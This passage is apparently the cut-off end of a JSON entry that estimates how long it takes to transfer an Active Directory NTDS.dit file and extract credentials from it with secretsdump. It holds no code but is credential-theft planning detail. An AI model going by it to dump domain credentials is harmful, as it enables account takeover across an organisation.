NTDS.dit size)\nTransfer: 1-30 minutes (100MB-50GB file, connection dependent)\nProcessing with secretsdump: 30 seconds - 5 minutes (depends on domain size)\nTotal: 2-35 minutes"
    }
  ]
}